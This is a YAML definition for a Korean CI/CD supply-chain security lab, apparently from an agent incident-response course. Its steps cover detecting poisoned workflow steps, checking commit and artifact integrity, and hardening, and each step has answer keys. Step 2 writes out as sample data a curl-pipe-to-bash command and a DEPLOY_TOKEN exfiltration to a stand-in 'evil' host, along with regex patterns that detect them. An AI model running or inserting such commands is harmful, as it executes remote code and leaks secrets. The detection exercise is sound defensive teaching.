lab_id: agent-ir-adv-week14
title: "W14 — CI/CD 공급망 오염: 파이프라인 오염 탐지·무결성 위반·강화"
version: ai
course: agent-ir-adv
week: 14
description: |
  CI/CD 파이프라인 오염 방어. 악성 워크플로·비밀 유출 탐지(PIPELINE_POISON_DETECTED), 커밋·아티팩트
  무결성 위반(INTEGRITY_VIOLATION), 서명·최소권한·비밀 스캐닝 강화(HARDENED), 종합(Assessment).
  ⚠️ CI/CD 인프라 el34 밖 — 오염 탐지·무결성 로직 결정론 시뮬.
difficulty: hard
duration_minutes: 150
audience: 에이전트 IR 심화 (14주차)
prerequisites:
  - el34 호스트 접속 (`ssh ccc@{{TARGET_IP}}`, 비밀번호 `1`)
  - GPU Ollama 도달 — gemma3:4b
  - W14 강의안 정독 — §0.5(CI/CD 오염·무결성·서명)
objectives:
  - "GPU 헬스체크(GEN_OK)"
  - "악성 워크플로·비밀 유출 탐지(PIPELINE_POISON_DETECTED)"
  - "커밋·아티팩트 무결성 위반(INTEGRITY_VIOLATION)"
  - "서명·최소권한·비밀 스캐닝 강화(HARDENED)"
  - "종합(Assessment)"
pass_threshold: 0.6

steps:

  - order: 1
    instruction: |
      ## STEP 1 — GPU 헬스체크 → GEN_OK
      ```bash
      curl -s http://211.170.162.139:10934/api/generate \
        -d '{"model":"gemma3:4b","prompt":"Reply with the word ready.","stream":false,"options":{"num_predict":10}}' \
       | python3 -c "import sys,json; r=json.load(sys.stdin).get('response',''); print(r); print('GEN_OK' if r.strip() else 'GEN_EMPTY')"
      ```
      ✅ 마지막 줄 `GEN_OK`.
    answer: |
      ready
      GEN_OK
    answer_detail: "GPU 응답 확인."
    verify:
      type: output_contains
      expect: GEN_OK
      field: stdout

  - order: 2
    instruction: |
      ## STEP 2 — 파이프라인 오염 탐지 → PIPELINE_POISON_DETECTED
      > **🎯 목표:** 워크플로 변경에서 악성 단계·비밀 유출을 탐지.
      > **개념:** 파이프라인에 외부 실행·비밀 전송이 끼면 오염.
      ```bash
      python3 - <<'PY'
      import re
      # 변경된 CI 워크플로 단계들
      steps=["run: npm ci",
             "run: curl -s http://185.evil/x.sh | bash",          # 외부 스크립트 실행!
             "run: echo $DEPLOY_TOKEN | curl -X POST http://185.evil/collect",  # 비밀 유출!
             "run: npm test"]
      POISON=[re.compile(r"curl.*\|\s*(bash|sh)"),                  # 외부 스크립트 실행
              re.compile(r"(TOKEN|SECRET|KEY|PASSWORD).*curl|curl.*(TOKEN|SECRET|KEY)", re.I)]  # 비밀 외부 전송
      flagged=[s for s in steps if any(p.search(s) for p in POISON)]
      for s in steps:
          bad=any(p.search(s) for p in POISON)
          print(f"  {'POISON' if bad else 'ok    '}: {s[:48]}")
      print("PIPELINE_POISON_DETECTED" if len(flagged)>=2 else "CLEAN")
      PY
      ```
      ✅ 마지막 줄 `PIPELINE_POISON_DETECTED` (외부 스크립트 실행 + 비밀 외부 전송 단계).
      🔎 빌드 단계에 외부 스크립트 파이프 실행·비밀(DEPLOY_TOKEN) 외부 전송이 끼면 파이프라인 오염.
    answer: |
      ok    : run: npm ci
      POISON: run: curl -s http://185.evil/x.sh | bash
      POISON: run: echo $DEPLOY_TOKEN | curl -X POST http://185.evil/collect
      ok    : run: npm test
      PIPELINE_POISON_DETECTED
    answer_detail: "워크플로 악성 단계(외부 실행·비밀 유출) 탐지 → PIPELINE_POISON_DETECTED."
    verify:
      type: output_contains
      expect: PIPELINE_POISON_DETECTED
      field: stdout

  - order: 3
    instruction: |
      ## STEP 3 — 무결성 위반 → INTEGRITY_VIOLATION
      > **🎯 목표:** 미서명 커밋·변조 아티팩트를 탐지.
      > **개념:** 서명이 "진짜·미변조"를 증명 — 미서명은 의심.
      ```bash
      python3 - <<'PY'
      # 커밋·아티팩트 무결성
      commits=[{"id":"a1b2","signed":True,"author":"kim@corp"},
               {"id":"c3d4","signed":False,"author":"unknown"}]        # 미서명·미인가!
      artifact={"name":"app-1.0.jar","expected_hash":"abc123","actual_hash":"XYZ999"}  # 해시 불일치!
      violations=[]
      for c in commits:
          if not c["signed"]: violations.append(f"unsigned commit {c['id']} by {c['author']}")
      if artifact["expected_hash"]!=artifact["actual_hash"]:
          violations.append(f"artifact hash mismatch ({artifact['name']})")
      for v in violations: print("  violation:", v)
      print("INTEGRITY_VIOLATION" if violations else "INTEGRITY_OK")
      PY
      ```
      ✅ 마지막 줄 `INTEGRITY_VIOLATION` (미서명 커밋 + 아티팩트 해시 불일치).
      🔎 미서명 커밋은 누가 만들었나 불확실, 해시 불일치는 아티팩트 변조. 서명·해시로 무결성 검증.
    answer: |
      violation: unsigned commit c3d4 by unknown
      violation: artifact hash mismatch (app-1.0.jar)
      INTEGRITY_VIOLATION
    answer_detail: "미서명 커밋·아티팩트 해시 불일치 탐지 → INTEGRITY_VIOLATION."
    verify:
      type: output_contains
      expect: INTEGRITY_VIOLATION
      field: stdout

  - order: 4
    instruction: |
      ## STEP 4 — 강화 → HARDENED
      > **🎯 목표:** 서명·최소권한 CI·비밀 스캐닝·파이프라인 보호 적용.
      > **개념:** 무결성 검증+접근 통제로 오염을 원천 차단.
      ```bash
      python3 - <<'PY'
      # 강화 정책 적용
      def secure_pipeline(config):
          checks={}
          checks["signed_commits_required"]=config.get("require_signed_commits",False)
          checks["ci_token_least_priv"]=config.get("ci_token_scope")=="deploy-only"
          checks["secret_scanning"]=config.get("secret_scanning",False)
          checks["branch_protection"]=config.get("require_review",False)
          return all(checks.values()), checks
      insecure={"require_signed_commits":False,"ci_token_scope":"admin","secret_scanning":False,"require_review":False}
      hardened={"require_signed_commits":True,"ci_token_scope":"deploy-only","secret_scanning":True,"require_review":True}
      pi,ci=secure_pipeline(insecure); ph,ch=secure_pipeline(hardened)
      print("insecure pipeline:", "SECURE" if pi else "VULNERABLE", ci)
      print("hardened pipeline:", "SECURE" if ph else "VULNERABLE")
      print("HARDENED" if not pi and ph else "CHECK")
      PY
      ```
      ✅ 마지막 줄 `HARDENED` (서명 필수+최소권한 토큰+비밀 스캐닝+리뷰 필수 모두 적용).
      🔎 서명된 커밋+deploy-only 토큰+비밀 스캐닝+브랜치 보호를 모두 갖춰야 안전. 무결성+접근 통제.
    answer: |
      insecure pipeline: VULNERABLE {'signed_commits_required': False, 'ci_token_least_priv': False, 'secret_scanning': False, 'branch_protection': False}
      hardened pipeline: SECURE
      HARDENED
    answer_detail: "서명·최소권한·비밀 스캐닝·브랜치 보호 강화 → HARDENED."
    verify:
      type: output_contains
      expect: HARDENED
      field: stdout

  - order: 5
    instruction: |
      ## STEP 5 — 종합 → Assessment
      ```bash
      curl -s http://211.170.162.139:10934/api/generate \
        -d '{"model":"gemma3:4b","prompt":"Write a short note for W14 on CI/CD supply-chain poisoning. Findings: malicious workflow steps (external script exec, secret exfil) were detected (PIPELINE_POISON_DETECTED), an unsigned commit and mismatched artifact hash flagged integrity violations (INTEGRITY_VIOLATION), and hardening with signed commits, least-privilege CI tokens, secret scanning, and branch protection secured it (HARDENED). Explain that poisoning CI/CD spreads malware to every deployment like SolarWinds, so defense protects pipeline integrity with signing, least privilege, and access control. Start with exactly Assessment on its own line.","stream":false,"options":{"num_predict":330}}' \
       | python3 -c "import sys,json; r=json.load(sys.stdin).get('response',''); print(r); print('' if 'Assessment' in r else '[형식 미준수 — 재실행]')"
      ```
      ✅ 출력에 `Assessment`.
      🔎 정리: CI/CD 오염은 모든 배포로 확산. 파이프라인 무결성(서명)+최소권한+접근 통제로 방어.
      다음 주(W15)는 마지막 **장기 APT 잠복**.
    answer: |
      Assessment
      Poisoning CI/CD spreads malware to every deployment (SolarWinds-style), so pipeline integrity is critical.
      Defense uses signed commits/artifacts, least-privilege CI tokens, secret scanning, and branch protection.
    answer_detail: "W14 CI/CD 오염 종합(Assessment). 파이프라인 무결성·서명·최소권한·접근 통제."
    verify:
      type: output_contains
      expect: Assessment
      field: stdout
